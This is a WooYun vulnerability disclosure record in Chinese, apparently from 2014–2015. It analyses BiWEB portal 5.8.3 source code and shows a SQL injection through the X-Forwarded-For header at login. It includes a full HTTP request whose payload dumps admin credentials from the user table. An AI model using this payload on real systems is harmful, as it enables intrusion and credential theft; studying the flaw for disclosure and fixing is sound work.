{"id": 43226, "wybug_id": "wooyun-2014-083404", "wybug_title": "BiWEB最新门户版XFF注入一枚", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-11-17 19:09", "wybug_open_date": "2015-02-15 19:10", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新门户版XFF注入一枚 详细说明：  在wooyun上看到了有人把biweb的shell拿到了： WooYun: BIWEB门户版Getwebshell漏洞 ，也有人提了其他漏洞，我也来找找它的漏洞吧。去官网下BiWEB门户版最新的5.8.3来看看。看看用户登录处是怎么处理的。BiWEB首先对GET和POST进行了过滤，/config/filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n这里就先不说这种过滤的脑残之处了。继续往下看，判断用户是否可以正常登录的文件/user/login.php。\n无关代码if(!empty($_POST)){\tif (isset($_POST['authCode'])&&$_POST['authCode']!=$_SESSION['authCode']){\t\tcheck::AlertExit(\"错误：验证码不匹配!\",-1);\t}\tif ($objWebInit->userLogin($_POST,$arrGWeb['user_pass_type'],$arrGWeb['jamstr'])){\t\tcheck::AlertExit(\"恭喜您，登陆成功!\",$_SERVER['HTTP_REFERER']);\t}else{\t\t\tcheck::AlertExit(\"用户名，或者密码错误!\",$_SERVER['HTTP_REFERER']);\t}}无关代码\n去看看$objWebInit->userLogin()，在/user/class/user.class.php中\npublic function userLogin($arrData,$isEncryption=0,$jamStr){\t\tif(!check::CheckUser($arrData['User'])) {\t\t\tcheck::AlertExit(\"输入的用户名必须是4-20字符之间的数字、字母或中文!\",-1);\t\t\treturn false;\t\t}\t\tif(!check::CheckPassword($arrData['Pass'])) {\t\t\tcheck::AlertExit(\"输入的密码必须是4-20字符之间的数字、字母!\",-1);\t\t\treturn false;\t\t}\t\t$strPassTemp = $arrData['Pass'];\t\tif($isEncryption){\t\t\t$strPassTemp=check::strEncryption($strPassTemp,$jamStr);\t\t}\t\t$strSQL = \"SELECT * FROM $this->tablename2 WHERE user_name = ? and password = ?\";\t\t$rs = $this->db->prepare($strSQL);\t\t$rs->execute(array($arrData['User'],$strPassTemp));\t\tif($arr = $rs->fetchAll()){\t\t\t$arr = current($this->loadTableFieldG($arr));\t\t\t$user_id = '';\t\t\t$user_name = '';\t\t\t$password='';\t\t\t$real_name='';\t\t\t$user_group = '';\t\t\t$user_popedom = '';\t\t\t$submit_date='';\t\t\t$pass='';\t\t\t$email='';\t\t\t$tel='';\t\t\t$company_cn='';\t\t\t$user_type='';\t\t\t$user_bonus='';\t\t\t$_SESSION['user_id'] = $arr['user_id'];\t\t\t$_SESSION['user_name'] = $arr['user_name'];\t\t\t$_SESSION['password'] = $arr['password'];\t\t\t$_SESSION['user_group'] = $arr['user_group'];\t\t\t$_SESSION['user_grade'] = $arr['user_grade'];\t\t\t$_SESSION['user_popedom'] = $arr['user_popedom'];\t\t\t$_SESSION['real_name'] = $arr['real_name'];\t\t\t$_SESSION['email'] = $arr['email'];\t\t\t$_SESSION['tel'] = $arr['tel'];\t\t\t$_SESSION['company_cn'] = $arr['company_cn'];\t\t\t$_SESSION['user_type'] = $arr['user_type'];\t\t\t$_SESSION['user_bonus'] = $arr['user_bonus'];\t\t\t$_SESSION['pass'] = $arr['pass'];\t\t\t$_SESSION['province'] = $arr['province'];\t\t\t$_SESSION['city'] = $arr['city'];\t\t\t$_SESSION['type_id'] = $arr['type_id'];\t\t\t$arrUpdate['user_ip'] = check::getIP();\t\t\t$arrUpdate['lastlog '] = date('Y-m-d H:i:s');\t\t\t$arrUpdate['user_id'] = $arr['user_id'];\t\t\t$this->updateUser($arrUpdate);\t\t\treturn true;\t\t}else{\t\t\treturn false;\t\t}\t}可以看到这里有获取ip的语句$arrUpdate['user_ip'] = check::getIP();再去看看getIP的实现吧static function getIP(){\t\t$ip = '';\t\tif (getenv(\"HTTP_CLIENT_IP\")) $ip = getenv(\"HTTP_CLIENT_IP\");\t\telse if(getenv(\"HTTP_X_FORWARDED_FOR\"))\t$ip = getenv(\"HTTP_X_FORWARDED_FOR\");\t\t\t else if(getenv(\"REMOTE_ADDR\")) $ip = getenv(\"REMOTE_ADDR\");\t\t\t\t  else $ip = \"Unknow\";\t\treturn $ip;\t}\n到这里就知道有问题了，登录，抓包，使用X-FROWARDED-FOR带入注入语句，成功注入。Payload:\nPOST /user/login.php HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Referer: http://192.168.0.107/Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 192.168.0.107Content-Length: 65Proxy-Connection: Keep-AlivePragma: no-cachex-forwarded-for:1' or  (select 1 from (select count(*),concat(0x23,(select concat(user_name,0x23,password,0x23)from biweb_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or'Cookie: AJSTAT_ok_times=1; PHPSESSID=5s11q451a7ctalvsi4nfdelt97User=XXXX&Pass=xxxxxxxx&authCode=1815&button=%E7%99%BB+%E5%BD%95\n注入成功后SQL语句执行情况和爆出的管理员用户名和密码\n\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}